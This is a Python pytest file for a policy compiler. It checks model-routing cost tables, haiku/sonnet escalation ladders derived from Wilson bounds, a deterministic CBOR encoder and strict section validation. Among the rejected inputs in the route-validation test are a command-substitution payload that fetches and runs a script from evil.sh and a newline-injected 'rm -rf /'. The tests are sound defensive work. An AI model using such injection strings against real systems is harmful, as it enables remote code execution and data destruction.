"""06 §10.1/§10.2/§10.4 — CPVS, ladders, canonical sections (FR-ROUTE-004/006, FR-POLICY-001/002).
Goldens are hand-derived in comments from the closed forms, never from calling the module."""

import hashlib
import json
import math
from datetime import UTC, datetime
from pathlib import Path

import pytest
from app.policy_compiler import compile as pc
from app.policy_compiler.cpvs import CertifiedAttempt, CPVSCell, Regime, cpvs_table
from app.policy_compiler.ladders import build_ladders, conditional_pass
from pydantic import ValidationError

FIXTURE = Path(__file__).parent / "fixtures" / "policy_compiler_sections.cbor"
RANKER_FIXTURE = Path(__file__).parent / "fixtures" / "policy_compiler_sections_ranker.cbor"
RANKER_VECTOR = Path(__file__).resolve().parents[3] / (
    "conformance/vectors/bundle/cortex_learned_ranker.cbor"
)

# Quota regime (06 §8.4): W = 100 000 tokens per window, S = $200 ⇒ c = tokens / 500.
REGIME = Regime(cost_basis="quota", v_default=5.0, window_limit_tokens=100_000)


def _a(task, n, model, verdict, cls="fn", stage="certified", **tok):
    return CertifiedAttempt(
        task_id=task,
        attempt_n=n,
        model_id=model,
        task_class=cls,
        fused_verdict=verdict,
        verdict_stage=stage,
        cost_basis="quota",
        **tok,
    )


HAIKU = dict(input_tokens=300, output_tokens=100, cache_read_tokens=100)  # 500 tokens ⇒ c = 1.0
SONNET = dict(input_tokens=2000, output_tokens=800)  # 2800 tokens ⇒ c = 5.6


def attempts() -> tuple[CertifiedAttempt, ...]:
    """fn: haiku first on 80 tasks (48 S / 32 V); sonnet retries the 32 haiku failures at n=2
    (16 S / 16 V) and opens 30 fresh tasks at n=1 (26 S / 4 V). repo: 5 sonnet attempts (below
    D33's 30 ⇒ inherits sonnet's pool). One provisional row that must enter nothing."""
    rows = []
    for i in range(80):
        rows.append(_a(f"h{i}", 1, "haiku", "satisfied" if i < 48 else "violated", **HAIKU))
        if i >= 48:
            rows.append(_a(f"h{i}", 2, "sonnet", "satisfied" if i < 64 else "violated", **SONNET))
    for i in range(30):
        rows.append(_a(f"s{i}", 1, "sonnet", "satisfied" if i < 26 else "violated", **SONNET))
    for i in range(5):
        rows.append(_a(f"r{i}", 1, "sonnet", "satisfied", cls="repo", **SONNET))
    rows.append(
        _a("p0", 1, "opus", "satisfied", stage="provisional", input_tokens=9, output_tokens=9)
    )
    return tuple(rows)


# Wilson 95% LCB, z = 1.959963984540054 (same arithmetic as test_knee_table.py):
#   haiku fn      k=48  t=80  ⇒ 0.4904546500516039
#   sonnet pooled k=42  t=62  ⇒ 0.5536808809284809   (16 + 26 satisfied of 32 + 30)
#   sonnet | ¬haiku k=16 t=32 ⇒ 0.33630882869327483
#   knee n=1      k=79  t=115 ⇒ 0.5973204854580024   (48 + 26 + 5 of 80 + 30 + 5, pooled)
#   knee n=2      k=16  t=32  ⇒ 0.33630882869327483
H_LCB, S_LCB, COND = 0.4904546500516039, 0.5536808809284809, 0.33630882869327483


def test_cpvs_golden_cells():
    cells = {(c.task_class, c.model_id): c for c in cpvs_table(attempts(), REGIME)}
    assert set(cells) == {
        ("fn", "haiku"),
        ("fn", "sonnet"),
        ("repo", "sonnet"),
    }  # opus: provisional
    h, s, r = cells["fn", "haiku"], cells["fn", "sonnet"], cells["repo", "sonnet"]
    assert (h.p_lcb, h.cost, h.tokens_est, h.outcomes) == (pytest.approx(H_LCB), 1.0, 500, 80)
    assert h.cache_read_share == pytest.approx(0.2) and not h.inherited
    assert (s.p_lcb, s.cost, s.tokens_est, s.outcomes) == (
        pytest.approx(S_LCB),
        pytest.approx(5.6),
        2800,
        62,
    )
    # CPVS = c / p̂_LCB (06 §10.1): 1.0 / 0.49045 = 2.0389; 5.6 / 0.55368 = 10.114.
    assert (h.cpvs, s.cpvs) == (pytest.approx(2.03892, abs=1e-5), pytest.approx(10.11413, abs=1e-5))
    # D33: 5 outcomes < 30 ⇒ the repo cell carries sonnet's POOLED estimate (all task classes:
    # k = 16 + 26 + 5 = 47 of t = 67 ⇒ LCB 0.5834478625635624), marked inherited.
    assert r.inherited and (r.p_lcb, r.cost, r.outcomes) == (
        pytest.approx(0.5834478625635624),
        pytest.approx(5.6),
        67,
    )
    assert h.wire() == {
        "task_class": "fn",
        "model_id": "haiku",
        "p_pass": h.p_lcb,
        "tokens_est": 500,
    }


def test_cpvs_unpooled_thin_cell_is_unmeasured_not_guessed():
    thin = tuple(_a(f"t{i}", 1, "opus", "satisfied", **SONNET) for i in range(29))
    assert cpvs_table(thin, REGIME) == []
    assert len(cpvs_table(thin + (_a("t29", 1, "opus", "violated", **SONNET),), REGIME)) == 1
    with pytest.raises(ValueError, match="model_prices"):
        cpvs_table(attempts(), Regime(cost_basis="usd", v_default=5.0))


def test_ladder_prefix_principle_with_measured_correlation():
    # Incumbent = sonnet (higher p̂): TVO = 5.6 / 0.55368 = 10.1141.
    # 32 paired tasks ≥ MIN_CELL ⇒ P(sonnet | ¬haiku) MEASURED: LCB(16/32) = 0.33631.
    # κ = 0.55368 / 0.33631 = 1.64635; denom = 1 − (1 − 0.49045)·1.64635 = 0.16111;
    # index = 1.0 / 0.16111 = 6.2069 < 10.1141 ⇒ PREPEND;
    # TVO([haiku, sonnet]) = 1.0 + 0.50955·1.64635·10.1141 = 9.4846.
    (fn, repo) = build_ladders(cpvs_table(attempts(), REGIME), attempts())
    assert fn.ladder_id == "fn" and [r.model_id for r in fn.rungs] == ["haiku", "sonnet"]
    assert fn.tvo == pytest.approx(9.48462, abs=1e-4)
    # keep_prefix: haiku read cache (share 0.2) and has a rung above it; the top rung never.
    assert [r.keep_prefix for r in fn.rungs] == [True, False]
    assert repo.ladder_id == "repo" and [r.model_id for r in repo.rungs] == ["sonnet"]
    assert fn.wire() == {
        "ladder_id": "fn",
        "rungs": [
            {"model_id": "haiku", "keep_prefix": True},
            {"model_id": "sonnet", "keep_prefix": False},
        ],
    }


def _cell(m, p, c):
    return CPVSCell(
        task_class="fn", model_id=m, p_lcb=p, cost=c, tokens_est=1, outcomes=40, cache_read_share=0
    )


def test_ladder_without_pairs_takes_the_frechet_bound():
    cheap, strong = _cell("cheap", 0.6, 1.0), _cell("strong", 0.9, 10.0)
    # No paired evidence ⇒ P(strong | ¬cheap) ≥ (0.9 − 0.6)/(1 − 0.6) = 0.75 ⇒ κ = 1.2;
    # denom = 1 − 0.4·1.2 = 0.52 ⇒ index 1.923 < TVO 11.11 ⇒ prepend;
    # TVO([cheap, strong]) = 1 + 0.4·1.2·11.11 = 6.333.
    assert conditional_pass(cheap, strong, {}) == pytest.approx(0.75)
    (ladder,) = build_ladders([cheap, strong], [])
    assert [r.model_id for r in ladder.rungs] == ["cheap", "strong"]
    assert ladder.tvo == pytest.approx(6.3333, abs=1e-3)
    # Measured pairs override the bound (30 ≥ MIN_CELL): 0 rescues in 30 ⇒ LCB 0 ⇒ never.
    assert conditional_pass(cheap, strong, {("fn", "cheap", "strong"): (0, 30)}) == 0.0
    assert conditional_pass(cheap, strong, {("fn", "cheap", "strong"): (0, 29)}) == pytest.approx(
        0.75
    )
    # Ties on p̂ take the cheaper base; a costlier rung is never a candidate (prepend only).
    (ladder,) = build_ladders([_cell("cheap", 0.9, 1.0), strong], [])
    assert [r.model_id for r in ladder.rungs] == ["cheap"]


def test_correction_refuses_a_rung_independence_would_prepend():
    # cheap c=8 p=0.8 vs strong c=10 p=0.9: uncorrected index c/p = 10.0 < TVO 11.11 ⇒ prepend.
    # Fréchet bound (0.9 − 0.8)/0.2 = 0.5 ⇒ κ = 1.8; (1 − 0.8)·1.8 = 0.36; index = 8/0.64 = 12.5
    # ≥ 11.11 ⇒ REFUSED. This is 06 §10.2's "uncorrected, the prefix principle over-prepends".
    cheap, strong = _cell("cheap", 0.8, 8.0), _cell("strong", 0.9, 10.0)
    assert cheap.cpvs < strong.cpvs
    (ladder,) = build_ladders([cheap, strong], [])
    assert [r.model_id for r in ladder.rungs] == ["strong"] and ladder.tvo == pytest.approx(
        strong.cpvs
    )


def test_encoder_is_rfc8949_core_deterministic():
    enc = pc.encode
    assert enc({"a": 1, "b": [2, 3]}) == bytes.fromhex("a26161016162820203")
    assert enc({"aa": 1, "b": 2}) == bytes.fromhex("a261620262616101")  # by encoded bytes
    assert enc(1.0) == bytes.fromhex("f93c00") and enc(100000.0) == bytes.fromhex("fa47c35000")
    assert enc(1.1) == bytes.fromhex("fb3ff199999999999a") and enc(-0.0) == bytes.fromhex("f98000")
    assert enc(25) == bytes.fromhex("1819") and enc(1000) == bytes.fromhex("1903e8")
    assert enc(2**32) == bytes.fromhex("1b0000000100000000") and enc(-1) == b"\x20"
    assert enc(True) == b"\xf5" and enc("") == b"\x60" and enc(b"\x01") == b"\x41\x01"
    assert enc("é") == bytes.fromhex("62c3a9") and enc(pc.Raw(b"\xf6")) == b"\xf6"
    for bad in (math.nan, math.inf, None, object()):
        with pytest.raises((ValueError, TypeError)):
            enc(bad)


def test_compile_reproduces_the_committed_fixture_byte_for_byte():
    """The bytes go/controld/internal/policydist decodes under the strict reference decoder
    (drafts_test.go). Regenerate ONLY with a golden change here AND there."""
    out = pc.compile_sections(attempts(), REGIME)
    assert set(out.sections) == set(pc.SECTION_NAMES)
    assert out.sections_cbor == FIXTURE.read_bytes()
    assert out.draft_hash == hashlib.sha256(out.sections_cbor).digest()
    assert out.knee_gate_ok and "within ±1" in out.note and "defaulted" in out.note
    # The map is the six per-section byte strings under their sorted keys (compositional).
    assert out.sections_cbor == pc.encode({n: pc.Raw(b) for n, b in out.sections.items()})
    assert out.sections["gates"] == pc.encode_section(pc.DEFAULT_SECTIONS["gates"])
    # knee (06 §10.3) over the pooled certified attempts (all task classes), V = 5:
    #   n=1: c = (80·1.0 + 35·5.6)/115 = 2.4, p_lcb 0.59732 ⇒ 2.99 > 2.4, no stop
    #   n=2: c = 5.6, p_lcb 0.33631 ⇒ 1.68 ≤ 5.6 ⇒ implied knee 2
    #   γ̂ = 0.5/0.68696 = 0.72785; ρ̂ = 2.4/(0.68696·5) = 0.69873; k* = 1 + ⌊1.129⌋ = 2
    assert "implied knee 2 vs k*=2" in out.note


def test_carried_sections_ride_through_untouched():
    prev = {n: b"\xa0" if n != "route" else b"\x00" for n in pc.SECTION_NAMES}
    out = pc.compile_sections(attempts(), REGIME, previous=prev)
    assert all(out.sections[n] == b"\xa0" for n in pc.SECTION_NAMES if n != "route")
    assert out.sections["route"] != b"\x00" and "carried forward" in out.note
    with pytest.raises(ValueError, match="exactly"):
        pc.sections_map({"route": b"\xa0"})


def test_knee_sanity_gate_blocks_publication():
    # V = 10: n=2 still stops (3.36 ≤ 5.6) ⇒ implied 2; ρ̂ = 0.34937 ⇒ k* = 1 + ⌊3.31⌋ = 4;
    # |2 − 4| > 1 ⇒ VIOLATED.
    out = pc.compile_sections(
        attempts(), Regime(cost_basis="quota", v_default=10.0, window_limit_tokens=100_000)
    )
    assert not out.knee_gate_ok and "VIOLATED" in out.note
    provisional = tuple(a for a in attempts() if a.verdict_stage == "provisional")
    with pytest.raises(pc.NothingToCompile):
        pc.compile_sections(provisional, REGIME)


WINDOW_START = datetime(2026, 9, 1, tzinfo=UTC)


def test_identifiable_spectral_run_becomes_the_verify_section():
    """06 §4: an identifiable run's fitted [S,V] rows fill the section, refused/error stay at
    the literature default, groups/anchors/priors are derived honestly (never from calling the
    module -- hand-derived here, like every other golden in this file)."""
    run = pc.SpectralRun(
        window_start=WINDOW_START,
        passed=True,
        confusion={
            "ruff@cat-1": ((0.8, 0.1, 0.1), (0.5, 0.4, 0.1)),  # lint
            "pytest@cat-1": ((0.9, 0.03, 0.07), (0.5, 0.45, 0.05)),  # test
            "tsc@cat-1": ((0.85, 0.05, 0.1), (0.4, 0.5, 0.1)),  # typecheck
        },
        prior=(0.6, 0.4),
    )
    vi = pc.VerifyInputs(spectral_run=run, stable_verify_cbor=None, stable_seq=None)
    out = pc.compile_sections(attempts(), REGIME, verify_inputs=vi)
    # Priors: R/E keep the bootstrap mass (0.10, 0.05); S/V rescale into the remaining 0.85.
    # syntactic∪tests is one clique by construction (07 normative): every anchor kind, whatever
    # its sub-kind, lands in the same "syntactic" group.
    expected = pc.VerifySection(
        anchors=(
            pc.AnchorEnable(catalog_id="pytest", enabled=True),
            pc.AnchorEnable(catalog_id="ruff", enabled=True),
            pc.AnchorEnable(catalog_id="tsc", enabled=True),
        ),
        verifiers=(
            pc.VerifierModel(
                verifier_id="pytest@cat-1",
                confusion=(
                    (0.9, 0.03, 0.07),
                    (0.5, 0.45, 0.05),
                    (0.30, 0.10, 0.60),
                    (0.25, 0.15, 0.60),
                ),
            ),
            pc.VerifierModel(
                verifier_id="ruff@cat-1",
                confusion=(
                    (0.8, 0.1, 0.1),
                    (0.5, 0.4, 0.1),
                    (0.30, 0.20, 0.50),
                    (0.25, 0.25, 0.50),
                ),
            ),
            pc.VerifierModel(
                verifier_id="tsc@cat-1",
                confusion=(
                    (0.85, 0.05, 0.1),
                    (0.4, 0.5, 0.1),
                    (0.30, 0.20, 0.50),
                    (0.25, 0.25, 0.50),
                ),
            ),
        ),
        priors=(0.51, 0.34, 0.10, 0.05),
        correlation_groups=(
            pc.CorrelationGroup(
                group_id="syntactic", members=("pytest@cat-1", "ruff@cat-1", "tsc@cat-1")
            ),
        ),
        quarantine=(),
    )
    assert out.sections["verify"] == pc.encode_section(expected)
    assert "verify: spectral run 2026-09-01" in out.note and "identifiable" in out.note
    # (e) round-trips: the map is exactly the six per-section bytes, and the section's own
    # productions (catalog_id, verifier_id, Prob) survive a decode-then-reencode.
    assert out.sections_cbor == pc.encode({n: pc.Raw(b) for n, b in out.sections.items()})
    assert pc.VerifySection.model_validate(expected.model_dump()) == expected


def test_verify_refuses_judge_and_rm_ids_the_wire_cannot_carry():
    """The registry's judge:/rm: keys carry a ':' the bundle's verifier-id production forbids
    (07 CDDL; go/mark1d's isVerifierID agrees) -- there is no wire-legal way to author them, so
    the compiler refuses rather than emit a section no edge could decode."""
    for verifier_id in ("judge:grounded-rubric@1", "rm:qwen3-4b@1"):
        run = pc.SpectralRun(
            window_start=WINDOW_START,
            passed=True,
            confusion={verifier_id: ((0.8, 0.1, 0.1), (0.2, 0.7, 0.1))},
            prior=(0.6, 0.4),
        )
        with pytest.raises(pc.VerifyBasisError, match="wire verifier-id"):
            pc.compile_sections(
                attempts(),
                REGIME,
                verify_inputs=pc.VerifyInputs(
                    spectral_run=run, stable_verify_cbor=None, stable_seq=None
                ),
            )


def test_non_identifiable_run_carries_the_stable_heads_verify_bytes_unchanged():
    stable_bytes = pc.encode_section(
        pc.VerifySection(
            anchors=(pc.AnchorEnable(catalog_id="pytest", enabled=True),),
            verifiers=(pc.VerifierModel(verifier_id="pytest@cat-1", confusion=((1, 0, 0),) * 4),),
            priors=(0.55, 0.30, 0.10, 0.05),
            correlation_groups=(
                pc.CorrelationGroup(group_id="syntactic", members=("pytest@cat-1",)),
            ),
            quarantine=(),
        )
    )
    not_passed = pc.SpectralRun(window_start=WINDOW_START, passed=False, confusion={}, prior=None)
    out = pc.compile_sections(
        attempts(),
        REGIME,
        verify_inputs=pc.VerifyInputs(
            spectral_run=not_passed, stable_verify_cbor=stable_bytes, stable_seq=7
        ),
    )
    assert out.sections["verify"] == stable_bytes
    assert "verify: carried from stable seq 7" in out.note

    # No run at all takes the same carry-forward path.
    out2 = pc.compile_sections(
        attempts(),
        REGIME,
        verify_inputs=pc.VerifyInputs(
            spectral_run=None, stable_verify_cbor=stable_bytes, stable_seq=7
        ),
    )
    assert out2.sections["verify"] == stable_bytes


def test_no_verify_basis_raises_nothing_to_compile():
    vi = pc.VerifyInputs(spectral_run=None, stable_verify_cbor=None, stable_seq=None)
    with pytest.raises(pc.NothingToCompile, match="no verify basis"):
        pc.compile_sections(attempts(), REGIME, verify_inputs=vi)


def test_verify_row_is_normalized_or_refuses_on_all_zero_or_nan():
    off_sum = pc.SpectralRun(
        window_start=WINDOW_START,
        passed=True,
        confusion={"ruff@cat-1": ((0.8, 0.2, 0.2), (0.5, 0.4, 0.1))},  # satisfied row sums to 1.2
        prior=(0.6, 0.4),
    )
    out = pc.compile_sections(
        attempts(),
        REGIME,
        verify_inputs=pc.VerifyInputs(
            spectral_run=off_sum, stable_verify_cbor=None, stable_seq=None
        ),
    )
    row = (0.8, 0.2, 0.2)  # sums to 1.2000000000000002 in float, not the 1.2 literal
    normalized_row = tuple(x / sum(row) for x in row)
    expected = pc.VerifySection(
        anchors=(pc.AnchorEnable(catalog_id="ruff", enabled=True),),
        verifiers=(
            pc.VerifierModel(
                verifier_id="ruff@cat-1",
                confusion=(normalized_row, (0.5, 0.4, 0.1), (0.30, 0.20, 0.50), (0.25, 0.25, 0.50)),
            ),
        ),
        priors=(0.51, 0.34, 0.10, 0.05),
        correlation_groups=(pc.CorrelationGroup(group_id="syntactic", members=("ruff@cat-1",)),),
        quarantine=(),
    )
    assert out.sections["verify"] == pc.encode_section(expected)

    all_zero = pc.SpectralRun(
        window_start=WINDOW_START,
        passed=True,
        confusion={"ruff@cat-1": ((0.0, 0.0, 0.0), (0.5, 0.4, 0.1))},
        prior=(0.6, 0.4),
    )
    with pytest.raises(pc.VerifyBasisError, match="all-zero"):
        pc.compile_sections(
            attempts(),
            REGIME,
            verify_inputs=pc.VerifyInputs(
                spectral_run=all_zero, stable_verify_cbor=None, stable_seq=None
            ),
        )

    nan_row = pc.SpectralRun(
        window_start=WINDOW_START,
        passed=True,
        confusion={"ruff@cat-1": ((math.nan, 0.5, 0.5), (0.5, 0.4, 0.1))},
        prior=(0.6, 0.4),
    )
    with pytest.raises(pc.VerifyBasisError, match="NaN"):
        pc.compile_sections(
            attempts(),
            REGIME,
            verify_inputs=pc.VerifyInputs(
                spectral_run=nan_row, stable_verify_cbor=None, stable_seq=None
            ),
        )


def test_verify_refuses_a_verifier_kind_it_cannot_resolve():
    unresolvable = pc.SpectralRun(
        window_start=WINDOW_START,
        passed=True,
        confusion={"consistency": ((0.6, 0.2, 0.2), (0.3, 0.5, 0.2))},
        prior=(0.6, 0.4),
    )
    with pytest.raises(pc.VerifyBasisError, match="no kind"):
        pc.compile_sections(
            attempts(),
            REGIME,
            verify_inputs=pc.VerifyInputs(
                spectral_run=unresolvable, stable_verify_cbor=None, stable_seq=None
            ),
        )


ROUTE_OK = {
    "cpvs": [{"task_class": "fn", "model_id": "claude-sonnet-4.5", "p_pass": 0.5, "tokens_est": 1}],
    "ladders": [{"ladder_id": "fn", "rungs": [{"model_id": "haiku", "keep_prefix": True}]}],
    "knee": {"cost_basis": "usd", "rows": [{"n": 1, "c_n": 0.1, "p_lcb": 0.5}], "v_default": 1.0},
}


def _with(d: dict, path: str, value):
    """Deep copy of d with the dotted path (ints index lists) replaced by value."""
    import copy

    out = copy.deepcopy(d)
    *parents, last = [int(k) if k.isdigit() else k for k in path.split(".")]
    cur = out
    for k in parents:
        cur = cur[k]
    cur[last] = value
    return out


# The cortex section of conformance/vectors/bundle/cortex_learned_ranker.cbor, by value.
CORTEX_RANKER_OK = {
    "map_budget_tokens": {"min": 400, "max": 2000},
    "channels": ["session_start", "prompt_submit", "before_model"],
    "learned_ranker": {
        "stage": "shadow",
        "weight": 0.5,
        "bias": 0.05,
        "coefficients": [0.6, 0.25, -0.1, 0.15],
    },
}


@pytest.mark.parametrize(
    "path,value",
    [
        ("cpvs.0.model_id", "$(curl evil.sh|sh)"),
        ("cpvs.0.model_id", "claude sonnet"),
        ("cpvs.0.task_class", "edit/small"),
        ("cpvs.0.task_class", ""),
        ("cpvs.0.task_class", "x" * 129),
        ("ladders.0.ladder_id", "fn\n; rm -rf /"),
        ("ladders.0.rungs.0.model_id", "haiku'"),
        ("ladders.0.rungs", []),
        ("knee.cost_basis", "tokens"),
        ("knee.rows", []),
        ("knee.rows.0.p_lcb", 1.5),
        ("knee.rows.0.c_n", -1.0),
        ("cpvs.0.p_pass", -0.1),
        ("cpvs.0.tokens_est", -1),
        ("knee.v_default", "abc"),
    ],
)
def test_route_refuses_every_string_outside_its_production(path, value):
    """07 decode rule 1: a bare tstr is the identifier production, never text; rule 3: strict."""
    pc.RouteSection.model_validate(ROUTE_OK)
    with pytest.raises(ValidationError):
        pc.RouteSection.model_validate(_with(ROUTE_OK, path, value))
    with pytest.raises(ValidationError):
        pc.RouteSection.model_validate({**ROUTE_OK, "wasm_module": b""})


@pytest.mark.parametrize(
    "model,doc",
    [
        (
            pc.VerifySection,
            {
                "anchors": [{"catalog_id": "Pytest", "enabled": True}],
                "verifiers": [],
                "priors": [1, 0, 0, 0],
                "correlation_groups": [],
                "quarantine": [],
            },
        ),
        (
            pc.VerifySection,
            {
                "anchors": [
                    {"catalog_id": "pytest", "enabled": True, "thresholds": {"min pass": 0.5}}
                ],
                "verifiers": [],
                "priors": [1, 0, 0, 0],
                "correlation_groups": [],
                "quarantine": [],
            },
        ),
        (
            pc.VerifySection,
            {
                "anchors": [],
                "verifiers": [],
                "priors": [1, 0, 0, 0],
                "correlation_groups": [{"group_id": "g", "members": []}],
                "quarantine": [],
            },
        ),
        (
            pc.VerifySection,
            {
                "anchors": [],
                "verifiers": [],
                "priors": [1, 0, 0, 0],
                "correlation_groups": [],
                "quarantine": ["lint/er"],
            },
        ),
        (
            pc.VerifySection,
            {
                "anchors": [],
                "verifiers": [{"verifier_id": "v", "confusion": [[1, 0, 0]] * 3}],
                "priors": [1, 0, 0, 0],
                "correlation_groups": [],
                "quarantine": [],
            },
        ),
        (pc.CortexSection, {"map_budget_tokens": {"min": 0, "max": 0}, "channels": ["shell"]}),
        *(
            (pc.CortexSection, _with(CORTEX_RANKER_OK, path, value))
            for path, value in [
                ("learned_ranker.stage", "canary"),
                ("learned_ranker.weight", 1.5),
                ("learned_ranker.weight", -0.1),
                ("learned_ranker.weight", math.nan),
                ("learned_ranker.bias", math.inf),
                ("learned_ranker.bias", "abc"),
                ("learned_ranker.coefficients", [0.6, 0.25, -0.1]),
                ("learned_ranker.coefficients", [0.6, 0.25, -0.1, 0.15, 0.0]),
                ("learned_ranker.coefficients", [0.6, math.nan, -0.1, 0.15]),
                ("learned_ranker.model_id", "x"),
            ]
        ),
        (
            pc.GatesSection,
            {"stop_gate_enabled": True, "max_consecutive_blocks": 4, "hourly_block_ceiling": 0},
        ),
        (
            pc.MemorySection,
            {"injection_rules": [{"facet": "repo conventions"}], "budgets": {"pack_tokens_max": 0}},
        ),
        (
            pc.AgentMapsSection,
            {
                "agents": [
                    {
                        "agent_id": "claudecode",
                        "agent_version": "1",
                        "hook_fields": {"Session": "/s"},
                        "tailer_rules": {},
                    }
                ]
            },
        ),
        (
            pc.AgentMapsSection,
            {
                "agents": [
                    {
                        "agent_id": "claudecode",
                        "agent_version": "1",
                        "hook_fields": {"s": "/a~2b"},
                        "tailer_rules": {},
                    }
                ]
            },
        ),
        (
            pc.AgentMapsSection,
            {
                "agents": [
                    {
                        "agent_id": "claudecode",
                        "agent_version": "1",
                        "hook_fields": {"s": "a/b"},
                        "tailer_rules": {},
                    }
                ]
            },
        ),
        (
            pc.AgentMapsSection,
            {
                "agents": [
                    {
                        "agent_id": "claudecode",
                        "agent_version": "1",
                        "hook_fields": {},
                        "tailer_rules": {"t": "/" + "x" * 1024},
                    }
                ]
            },
        ),
        (
            pc.AgentMapsSection,
            {
                "agents": [
                    {
                        "agent_id": "claude code",
                        "agent_version": "1",
                        "hook_fields": {},
                        "tailer_rules": {},
                    }
                ]
            },
        ),
    ],
)
def test_other_sections_refuse_their_productions_too(model, doc):
    with pytest.raises(ValidationError):
        model.model_validate(doc)


def test_learned_ranker_encodes_to_the_frozen_vectors_bytes():
    """The optional key is authored through the same productions the edge decodes: the
    section encodes to the exact bytes frozen in cortex_learned_ranker.cbor (found verbatim
    after the sections map's "cortex" key), and every stage of the closed enum encodes."""
    cortex = pc.CortexSection.model_validate(CORTEX_RANKER_OK)
    assert cortex.learned_ranker is not None and cortex.learned_ranker.stage == "shadow"
    encoded = pc.encode_section(cortex)
    vector = RANKER_VECTOR.read_bytes()
    key = pc.encode("cortex")
    at = vector.find(key + b"\xa3")
    assert at > 0 and vector[at + len(key) : at + len(key) + len(encoded)] == encoded
    assert b"learned_ranker" in encoded
    bare = pc.CortexSection.model_validate(
        {k: v for k, v in CORTEX_RANKER_OK.items() if k != "learned_ranker"}
    )
    assert bare.learned_ranker is None and b"learned_ranker" not in pc.encode_section(bare)
    for stage in ("probation", "shadow", "active"):
        for weight in (0.0, 1.0):
            doc = _with(
                _with(CORTEX_RANKER_OK, "learned_ranker.stage", stage),
                "learned_ranker.weight",
                weight,
            )
            assert pc.CortexSection.model_validate(doc).learned_ranker.weight == weight


def test_ranker_bearing_draft_carries_through_to_the_committed_fixture():
    """A previous draft whose cortex carries learned_ranker rides through compile byte-for-byte
    (like every other cortex field), and the whole map is pinned to a fixture that
    go/controld/internal/policydist decodes under the strict reference decoder
    (bundle_test.go TestDraftPublisherDecodesRankerFixture). Regenerate ONLY with a golden
    change here AND there."""
    cortex = pc.encode_section(pc.CortexSection.model_validate(CORTEX_RANKER_OK))
    previous = dict(pc.compile_sections(attempts(), REGIME).sections)
    previous["cortex"] = cortex
    out = pc.compile_sections(attempts(), REGIME, previous=previous)
    assert out.sections["cortex"] == cortex and "carried forward" in out.note
    assert out.sections_cbor == RANKER_FIXTURE.read_bytes()
    assert all(out.sections[n] == previous[n] for n in pc.SECTION_NAMES if n != "route")
    assert out.sections_cbor != FIXTURE.read_bytes()  # the ranker is the only difference


def test_pointer_production_admits_rfc6901_and_the_empty_pointer():
    ok = pc.AgentMapsSection.model_validate(
        {
            "agents": [
                {
                    "agent_id": "codex",
                    "agent_version": "0.9",
                    "hook_fields": {
                        "usage.input_tokens": "/message/usage/input_tokens",
                        "root": "",
                    },
                    "tailer_rules": {"escaped": "/a~1b~0c"},
                }
            ]
        }
    )
    assert ok.agents[0].hook_fields["root"] == ""


def test_compile_refuses_an_unconstrained_task_class_from_the_ledger():
    bad = attempts() + tuple(
        _a(f"x{i}", 1, "haiku", "satisfied", cls="edit small", **HAIKU) for i in range(30)
    )
    with pytest.raises(ValidationError, match="identifier"):
        pc.compile_sections(bad, REGIME)


def test_knee_label_is_the_ledgers_task_class_and_pools_a_mixed_window():
    """The knee is fitted on whatever class the rows carry (no assumed class): one class in
    the window labels the table with it; two classes pool under "*" because 07's route.knee
    is a single table, and the note says which."""
    fn_only = tuple(a for a in attempts() if a.task_class == "fn")
    assert "attempts of task_class fn:" in pc.compile_sections(fn_only, REGIME).note
    assert "attempts of task_class any:" in pc.compile_sections(attempts(), REGIME).note


async def test_compile_refuses_a_mixed_basis_window_before_touching_postgres(monkeypatch):
    """CON-014 over the rows the choke serves: two bases in one window park the job, with the
    pool never acquired (None here) and no regime consulted."""
    from datetime import UTC, datetime
    from types import SimpleNamespace

    from app.jobs.runner import JobContext
    from app.policy_compiler import jobs
    from choke_mock import MockChoke

    monkeypatch.setenv("INTEL_QUERYCHOKE_TOKEN", "svc")
    rows = [a.model_dump() for a in attempts()]
    rows[0]["cost_basis"] = "usd"
    choke = MockChoke()
    choke.templates[jobs.ATTEMPTS_TEMPLATE] = rows
    ctx = JobContext(
        pool=None,
        settings=SimpleNamespace(querychoke_base_url="http://choke", http_timeout_s=1.0),
        tenant_id="t",
        window_start=datetime(2026, 9, 15, tzinfo=UTC),
    )
    async with choke.client() as http:
        with pytest.raises(RuntimeError, match="never mixed"):
            await jobs.compile(ctx, http=http, regime=REGIME)


CHOKE_FIXTURE = Path(__file__).resolve().parents[3] / (
    "go/controld/internal/querychoke/testdata/intel_template_rows.json"
)


async def test_controld_fixture_rows_are_certified_attempts():
    """Two-way wire lock on `policy_compiler_attempts`: the Go side asserts the template's
    aliases equal these keys; here the keys equal CertifiedAttempt's fields and the rows go
    through jobs.read_attempts (the exact half-open window the template takes) unchanged."""
    from datetime import date

    from app.policy_compiler import jobs
    from app.tvo.reader import QuerychokeReader
    from choke_mock import MockChoke

    rows = json.loads(CHOKE_FIXTURE.read_text())["policy_compiler_attempts"]
    assert rows and {k for r in rows for k in r} == set(CertifiedAttempt.model_fields)
    choke = MockChoke()
    choke.templates[jobs.ATTEMPTS_TEMPLATE] = rows
    async with choke.client() as http:
        got = await jobs.read_attempts(
            QuerychokeReader(http, "http://choke"), date(2026, 9, 16), bearer="svc"
        )
    assert [a.model_dump() for a in got] == rows
    assert choke.requests == [
        (jobs.ATTEMPTS_TEMPLATE, {"from": "2026-08-18", "to": "2026-09-17"}, "Bearer svc")
    ]
    # The ledger's not-yet-stamped basis ('' until C1.9 lands) parks the job loudly, never
    # prices under a guessed basis (CON-014).
    with pytest.raises(ValidationError, match="cost_basis"):
        CertifiedAttempt.model_validate({**rows[0], "cost_basis": ""})


def test_edge_unclassified_class_and_modelless_attempts_compile_onto_the_wire():
    # prod 2026-09-23: the edge's "*" class and a Usage-less attempt failed the route section
    rows = [_a(f"t{i}", 1, "claude-sonnet-5", "satisfied", cls="*", **SONNET) for i in range(30)]
    rows.append(_a("t-none", 1, "", "violated", cls="*"))
    cells = cpvs_table(rows, REGIME)
    assert [(c.task_class, c.model_id) for c in cells] == [("any", "claude-sonnet-5")]
    for c in cells:
        pc.CPVSRow.model_validate(c.wire())
